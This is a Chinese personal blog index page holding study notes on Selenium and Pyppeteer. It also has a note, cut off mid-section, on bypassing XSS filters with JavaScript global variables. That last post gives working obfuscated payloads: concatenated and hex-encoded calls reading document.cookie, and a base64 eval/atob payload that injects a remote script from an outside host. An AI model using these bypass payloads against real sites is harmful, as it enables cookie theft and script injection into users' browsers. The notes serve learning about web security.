<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title></title>

  
  <meta name="author" content="damn1t">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/archives">归档</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/22/python/selenium学习笔记/"><span>selenium学习笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/22/python/selenium学习笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-22T14:36:01.039Z">
          2019-06-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="selenium学习笔记"><a href="#selenium学习笔记" class="headerlink" title="selenium学习笔记"></a>selenium学习笔记</h1><p>selenium可以模拟浏览器登录，且提供了很多api方便用户调用</p>
<h2 id="常用api"><a href="#常用api" class="headerlink" title="常用api"></a>常用api</h2><h3 id="浏览器操作"><a href="#浏览器操作" class="headerlink" title="浏览器操作"></a>浏览器操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 刷新</span><br><span class="line">driver.refresh()</span><br><span class="line"> </span><br><span class="line"># 前进</span><br><span class="line">driver.forward()</span><br><span class="line"> </span><br><span class="line"># 后退</span><br><span class="line">driver.back()</span><br></pre></td></tr></table></figure>
<h3 id="获取标签元素"><a href="#获取标签元素" class="headerlink" title="获取标签元素"></a>获取标签元素</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 通过ID定位目标元素</span><br><span class="line">driver.find_element_by_id(&apos;i1&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过className定位目标元素</span><br><span class="line">driver.find_element_by_class_name(&apos;c1&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过name属性定位目标元素</span><br><span class="line">driver.find_element_by_name(&apos;n1&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过Xpath定位目标元素</span><br><span class="line">driver.find_element_by_xpath(&apos;//*[@id=&quot;i1&quot;]&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过css Selector定位目标元素</span><br><span class="line">driver.find_element_by_css_selector(&apos;#i1&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过标签名称定位(注：在一个页面中，标签一定会重复，所以不用这个来进行定位)</span><br><span class="line">driver.find_element_by_tag_name(&apos;input&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过标签中的文本查找元素</span><br><span class="line">driver.find_element_by_link_text(&apos;登录&apos;)</span><br><span class="line"> </span><br><span class="line"># 通过标签中文本的模糊匹配查找</span><br><span class="line">driver.find_elements_by_partial_link_text(&apos;录&apos;)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>获取标签元素常用的一共有8种定位方式，而Selenium实际提供了18种定位方式，还有8种是上面的复数形式，这里就不一一介绍了，实际运用中并不常用，还有2种实际上是这上面所说16种的底层封装。参数化的一种调用方式而已。</p>
</blockquote>
<h3 id="Cookie操作"><a href="#Cookie操作" class="headerlink" title="Cookie操作"></a>Cookie操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 根据cookieKey，获取cookie信息</span><br><span class="line">cookie = driver.get_cookie(&apos;cookieKey&apos;)</span><br><span class="line"> </span><br><span class="line"># 获取所有cookie信息</span><br><span class="line">cookies = driver.get_cookies()</span><br><span class="line"> </span><br><span class="line"># 添加cookie，严格按照格式添加，cookie的key为name，value为value</span><br><span class="line">driver.add_cookie(&#123;&apos;name&apos;:&apos;tmp&apos;,&apos;value&apos;:&apos;123123123&apos;&#125;)</span><br><span class="line"> </span><br><span class="line"># 删除所有cookie信息</span><br><span class="line">driver.delete_all_cookies()</span><br><span class="line"> </span><br><span class="line"># 根据cookieKey删除对应cookie</span><br><span class="line">driver.delete_cookie(&apos;UiCode&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前浏览器的大小</span><br><span class="line">driver.get_window_size()</span><br><span class="line"> </span><br><span class="line"># 通过像素设置浏览器的大小</span><br><span class="line">driver.set_window_size(&apos;width&apos;,&apos;height&apos;)</span><br><span class="line"> </span><br><span class="line"># 获取当前窗口针对于Windows的位置的坐标x,y</span><br><span class="line">driver.get_window_position()</span><br><span class="line"> </span><br><span class="line"># 设置当前窗口针对Windows的位置，x,y</span><br><span class="line">driver.set_window_position(20,20)</span><br><span class="line"> </span><br><span class="line"># 最大化当前窗口,不需要传参</span><br><span class="line">driver.maximize_window()</span><br><span class="line"> </span><br><span class="line"># 返回当前操作的浏览器句柄</span><br><span class="line">driver.current_window_handle</span><br><span class="line"> </span><br><span class="line"># 返回所有打开server的浏览器句柄</span><br><span class="line">driver.window_handles</span><br></pre></td></tr></table></figure>
<h3 id="截取当前页面"><a href="#截取当前页面" class="headerlink" title="截取当前页面"></a>截取当前页面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前页面的二进制图片数据，需要自己去写入文件</span><br><span class="line">driver.get_screenshot_as_png()</span><br><span class="line"> </span><br><span class="line"># as_png的上层封装，只需要传入图片名称自动写成图片</span><br><span class="line">driver.get_screenshot_as_file(&apos;fileName.png&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="执行JavaScript语句"><a href="#执行JavaScript语句" class="headerlink" title="执行JavaScript语句"></a>执行JavaScript语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 执行JavaScript语句</span><br><span class="line">driver.execute_script(&apos;JavaScript Commond&apos;)</span><br><span class="line"> </span><br><span class="line"># 例：</span><br><span class="line"># 通过js来操作滚动条</span><br><span class="line"># 参数1：x  参数2： y</span><br><span class="line">window.scrollTo(100,400);</span><br></pre></td></tr></table></figure>
<h3 id="关闭与退出"><a href="#关闭与退出" class="headerlink" title="关闭与退出"></a>关闭与退出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 当开启多个时，关闭当前页面</span><br><span class="line">driver.close()</span><br><span class="line"> </span><br><span class="line"># 退出并关闭所有页面驱动</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 返回页面源码</span><br><span class="line">driver.page_source</span><br><span class="line"> </span><br><span class="line"># 返回tag标题</span><br><span class="line">driver.title</span><br><span class="line"> </span><br><span class="line"># 返回当前Url</span><br><span class="line">driver.current_url</span><br><span class="line"> </span><br><span class="line"># 获取浏览器名称 如：chrome</span><br><span class="line">driver.name</span><br></pre></td></tr></table></figure>
<h3 id="ElementApi接口"><a href="#ElementApi接口" class="headerlink" title="ElementApi接口"></a>ElementApi接口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># 根据标签属性名称,获取属性value</span><br><span class="line">element.get_attribute(&apos;style&apos;)</span><br><span class="line"> </span><br><span class="line"># 向输入框输入字符串 如果input的type为file类型 可以输入文件绝对路径上传文件</span><br><span class="line">element.send_keys()</span><br><span class="line"> </span><br><span class="line"># 清除文本内容</span><br><span class="line">element.clear()</span><br><span class="line"> </span><br><span class="line"># 鼠标左键点击操作</span><br><span class="line">element.click()</span><br><span class="line"> </span><br><span class="line"># 通过属性名称获取属性</span><br><span class="line">element.get_property(&apos;id&apos;)</span><br><span class="line"> </span><br><span class="line"># 返回元素是否可见 True or False</span><br><span class="line">element.is_displayed()</span><br><span class="line"> </span><br><span class="line"># 返回元素是否被选中 True or False</span><br><span class="line">element.is_selected()</span><br><span class="line"> </span><br><span class="line"># 返回标签元素的名字</span><br><span class="line">element.tag_name</span><br><span class="line"> </span><br><span class="line"># 获取当前标签的宽和高</span><br><span class="line">element.size</span><br><span class="line"> </span><br><span class="line"># 获取元素的文本内容</span><br><span class="line">element.text</span><br><span class="line"> </span><br><span class="line"># 模仿回车按钮 提交数据</span><br><span class="line">element.submit()</span><br><span class="line"> </span><br><span class="line"># 获取当前元素的坐标</span><br><span class="line">element.location</span><br><span class="line"> </span><br><span class="line"># 截取图片</span><br><span class="line">element.screenshot()</span><br></pre></td></tr></table></figure>
<h3 id="常见异常"><a href="#常见异常" class="headerlink" title="常见异常"></a>常见异常</h3><blockquote>
<p>　　NoSuchElementException：没有找到元素</p>
<p>　　NoSuchFrameException：没有找到iframe</p>
<p>　　NoSuchWindowException:没找到窗口句柄handle</p>
<p>　　NoSuchAttributeException:属性错误</p>
<p>　　NoAlertPresentException：没找到alert弹出框</p>
<p>　　ElmentNotVisibleException：元素不可见</p>
<p>　　ElementNotSelectableException：元素没有被选中</p>
<p>　　TimeoutException：查找元素超时</p>
</blockquote>
<p>api: <a href="https://selenium-python.readthedocs.io/api.html" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html</a></p>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="1-headless下的截屏"><a href="#1-headless下的截屏" class="headerlink" title="1.headless下的截屏"></a>1.headless下的截屏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.keys import Keys</span><br><span class="line">from selenium.webdriver.chrome.options import Options</span><br><span class="line">from selenium.webdriver.firefox.options import Options</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(&quot;--headless&quot;)</span><br><span class="line"></span><br><span class="line">url = &quot;https://bbs.pediy.com/thread-251690.htm&quot;</span><br><span class="line">#对应的chromedriver的放置目录</span><br><span class="line">driver = webdriver.Chrome(chrome_options=chrome_options)</span><br><span class="line"></span><br><span class="line">driver.get(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_time=time.time()</span><br><span class="line">print(&apos;this is start_time &apos;,start_time)</span><br><span class="line"></span><br><span class="line">driver.find_element_by_id(&quot;kw&quot;).send_keys(&quot;selenium webdriver&quot;)</span><br><span class="line">driver.find_element_by_id(&quot;su&quot;).click()</span><br><span class="line">time.sleep(3)</span><br><span class="line">driver.save_screenshot(&apos;screen.png&apos;)</span><br><span class="line"></span><br><span class="line">driver.close()</span><br><span class="line"></span><br><span class="line">end_time=time.time()</span><br><span class="line">print(&apos;this is end_time &apos;,end_time)</span><br></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2>
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/selenium/">selenium</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/21/python/Pyppeteer学习笔记/"><span>Pyppeteer学习笔记</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/21/python/Pyppeteer学习笔记/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-21T13:39:53.029Z">
          2019-06-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Pyppeteer学习笔记"><a href="#Pyppeteer学习笔记" class="headerlink" title="Pyppeteer学习笔记"></a>Pyppeteer学习笔记</h1><h2 id="有的没的"><a href="#有的没的" class="headerlink" title="有的没的"></a>有的没的</h2><p>浏览器处理过程中的每一个步骤：<br>1.处理HTML脚本，生成DOM树<br>2.处理CSS脚本，生成CSSOM树   （DOM和CSSOM是独立的数据结构）<br>3.将DOM树和CSSOM树合并为渲染树<br>4.对渲染树中的内容进行布局，计算每个节点的几何外观<br>5.将渲染树中的每个节点绘制到屏幕中</p>
<p>Headless Browser实际就是节约了第4,5步的时间。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>文档地址：<a href="https://miyakogi.github.io/pyppeteer/" target="_blank" rel="noopener">https://miyakogi.github.io/pyppeteer/</a><br>要求的最佳适配环境：py3.6</p>
<p>安装方法：</p>
<ul>
<li><code>pip install pyppeteer</code></li>
<li>安装chromium：<ol>
<li>因为国内的原因，源下载地址被屏蔽了，所以可以利用国内的镜像地址：<a href="https://npm.taobao.org/mirrors/chromium-browser-snapshots/" target="_blank" rel="noopener">https://npm.taobao.org/mirrors/chromium-browser-snapshots/</a>.</li>
<li>由于每次运行时都要指定chromium的路径，我的办法是自己写了个简单的模块，然后每次<code>import</code>，也可以每次在<code>launch</code>中直接引入<code>executablePath</code>的绝对路径</li>
</ol>
</li>
</ul>
<h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>首先要说的是，<a href="https://github.com/GoogleChrome/puppeteer" target="_blank" rel="noopener">puppeteer</a> 是一个<code>headless</code>的浏览器，由于<code>phantomJS</code>已经被deprecated，Firefox和chrome都已经开发出了自己的headless浏览器，puppeteer是个很好用的东西</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>官方给出了两个实例：</p>
<ol>
<li>截屏</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">from pyppeteer import launch</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    browser = await launch()</span><br><span class="line">    page = await browser.newPage()</span><br><span class="line">    await page.goto(&apos;http://example.com&apos;)</span><br><span class="line">    await page.screenshot(&#123;&apos;path&apos;: &apos;example.png&apos;&#125;)</span><br><span class="line">    await browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure>
<ol>
<li>调用JS脚本</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import asyncio</span><br><span class="line">from pyppeteer import launch</span><br><span class="line"></span><br><span class="line">async def main():</span><br><span class="line">    browser = await launch()</span><br><span class="line">    page = await browser.newPage()</span><br><span class="line">    await page.goto(&apos;http://example.com&apos;)</span><br><span class="line">    await page.screenshot(&#123;&apos;path&apos;: &apos;example.png&apos;&#125;)</span><br><span class="line"></span><br><span class="line">    dimensions = await page.evaluate(&apos;&apos;&apos;() =&gt; &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            width: document.documentElement.clientWidth,</span><br><span class="line">            height: document.documentElement.clientHeight,</span><br><span class="line">            deviceScaleFactor: window.devicePixelRatio,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;&apos;&apos;&apos;)</span><br><span class="line"></span><br><span class="line">    print(dimensions)</span><br><span class="line">    # &gt;&gt;&gt; &#123;&apos;width&apos;: 800, &apos;height&apos;: 600, &apos;deviceScaleFactor&apos;: 1&#125;</span><br><span class="line">    await browser.close()</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(main())</span><br><span class="line"></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">### 参数 ###</span><br><span class="line">有两种风格：</span><br><span class="line"></span><br><span class="line">- 键值对形式</span><br></pre></td></tr></table></figure>
<p>browser = await launch({‘headless’: True})</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 关键字形式</span><br></pre></td></tr></table></figure>
<p>browser = await launch(headless=True)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 元素选择器 ###</span><br><span class="line">在python中，`$`不被用来命名方法，所以改为了`querySelector`</span><br><span class="line"></span><br><span class="line">`Page.$()/Page.$$()/Page.$x()`都改为了`Page.querySelector()/Page.querySelectorAll()/Page.xpath()`，同样也有速记的方式：`Page.J(), Page.JJ(), and Page.Jx()`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### `Page.evaluate()`和`Page.querySelectorEval()`的参数 ###</span><br><span class="line">`Puppeteer`版本采用了js的原生方法和表达式字符串，但`pyppeteer`采用了js的字符串。js的字符串有时能够被作为函数或表达式，`Pyppeteer `尝试自动监测该字符串是否为函数或表达式，但有时他会失败了，所以 当一个表达式无法被识别，你可以使用`force_expr=True`让它生效</span><br><span class="line">例如：</span><br></pre></td></tr></table></figure>
<p>content = await page.evaluate(‘document.body.textContent’, force_expr=True)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取元素内部文本的示例：</span><br></pre></td></tr></table></figure>
<p>element = await page.querySelector(‘h1’)<br>title = await page.evaluate(‘(element) =&gt; element.textContent’, element)<br>```</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>快一年了，似乎已经停止更新了，orz</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Pyppeteer/">Pyppeteer</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/"><span>Bypass XSS filters using JavaScript global variables（笔记）</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/" rel="bookmark">
        <time class="entry-date published" datetime="2019-06-19T13:34:48.497Z">
          2019-06-19
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="Bypass-XSS-filters-using-JavaScript-global-variables"><a href="#Bypass-XSS-filters-using-JavaScript-global-variables" class="headerlink" title="Bypass XSS filters using JavaScript global variables"></a>Bypass XSS filters using JavaScript global variables</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很有意思的一篇文章，学到了一些姿势，以下仅作笔记</p>
<h2 id="你所需要知道的"><a href="#你所需要知道的" class="headerlink" title="你所需要知道的"></a>你所需要知道的</h2><h3 id="什么是js全局变量？"><a href="#什么是js全局变量？" class="headerlink" title="什么是js全局变量？"></a>什么是js全局变量？</h3><blockquote>
<p>A JavaScript global variable is declared outside the function or declared with window object. It can be accessed from any function. <a href="https://www.javatpoint.com/javascript-global-variable" target="_blank" rel="noopener">https://www.javatpoint.com/javascript-global-variable</a></p>
</blockquote>
<h3 id="关于-“self”-对象"><a href="#关于-“self”-对象" class="headerlink" title="关于 “self” 对象"></a>关于 “self” 对象</h3><blockquote>
<p>The Window.self read-only property returns the window itself, as a WindowProxy. It can be used with dot notation on a window object (that is, window.self) or standalone (self). The advantage of the standalone notation is that a similar notation exists for non-window contexts, such as in Web Workers. By using self, you can refer to the global scope in a way that will work not only in a window context (self will resolve to window.self) but also in a worker context (self will then resolve to WorkerGlobalScope.self). <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/self" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/Window/self</a></p>
</blockquote>
<p>与<code>self</code>有类似功能的对象：</p>
<ul>
<li>window</li>
</ul>
<ul>
<li>self</li>
</ul>
<ul>
<li>_self</li>
</ul>
<ul>
<li>this</li>
</ul>
<ul>
<li>top</li>
</ul>
<ul>
<li>parent</li>
</ul>
<ul>
<li>frames</li>
</ul>
<h2 id="1-级联和hex编码方式"><a href="#1-级联和hex编码方式" class="headerlink" title="1.级联和hex编码方式"></a>1.级联和hex编码方式</h2><p>有很多的WAF使用的过滤器都是基于JS的函数的黑名单模式，大多数都包含了诸如<code>alert()</code>或者<code>String.fromCharCode()</code>。幸好我们有全局变量，所以我们可以轻松的bypass，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">** alert(document.cookie);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self[&quot;ale&quot;+&quot;rt&quot;](self[&quot;doc&quot;+&quot;ument&quot;][&quot;coo&quot;+&quot;kie&quot;])</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-3.png" alt=""></p>
<p>稍复杂的绕过限制的方式是将字符串替换为以<code>\x</code>格式编码的hex序列（ascii码低于256）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; console.log(&quot;\x68\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21&quot;)</span><br><span class="line">&lt; hello, world!</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-2.png" alt=""></p>
<p>我们可以将其替换我们想使用的任意函数</p>
<h2 id="eval以及利用base64加密"><a href="#eval以及利用base64加密" class="headerlink" title="eval以及利用base64加密"></a>eval以及利用base64加密</h2><p>对于过滤我们输入的WAF，其中一个困难的事情就是动态创建或添加一个调用远程js文件的<code>script</code>元素。即使是一个功能不那么强大的过滤器，构建依然是困难的，因为这里有太多可识别的字符（<code>&lt;script</code>, <code>src=</code>, <code>http://</code>等等）</p>
<p>所以我们就可以利用<strong>base64</strong>和<code>eval()</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">self[&quot;\x65\x76\x61\x6c&quot;](//eval</span><br><span class="line">  self[&quot;\x61\x74\x6f\x62&quot;](//atob</span><br><span class="line">    &quot;dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\</span><br><span class="line">    c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\</span><br><span class="line">    HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\</span><br><span class="line">    QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\</span><br><span class="line">    oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\</span><br><span class="line">    aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\</span><br><span class="line">    y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\</span><br><span class="line">    5kQ2hpbGQoc2NyaXB0KTs=&quot;</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
<p>base64即是编码的如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// select head tag</span><br><span class="line">var head = document.getElementsByTagName(&apos;head&apos;).item(0); </span><br><span class="line"></span><br><span class="line">// create an empty &lt;script&gt; element</span><br><span class="line">var script = document.createElement(&apos;script&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element type attribute</span><br><span class="line">script.setAttribute(&apos;type&apos;, &apos;text/javascript&apos;);</span><br><span class="line"></span><br><span class="line">// set the script element src attribute</span><br><span class="line">script.setAttribute(&apos;src&apos;,&apos;http://example.com/my.js&apos;);</span><br><span class="line"></span><br><span class="line">// append it to the head element</span><br><span class="line">head.appendChild(script);</span><br></pre></td></tr></table></figure></p>
<p><img src="https://www.secjuice.com/content/images/2019/06/image-13.png" alt=""></p>
<h2 id="3-jQuery"><a href="#3-jQuery" class="headerlink" title="3.jQuery"></a>3.jQuery</h2><p>现在的网站大量利用了诸如jQuery的第三方库。当<code>self[&quot;eval&quot;]</code>和hex编码无法使用，于是我们可以利用如<code>self[&quot;$&quot;][&quot;globalEval&quot;]</code></p>
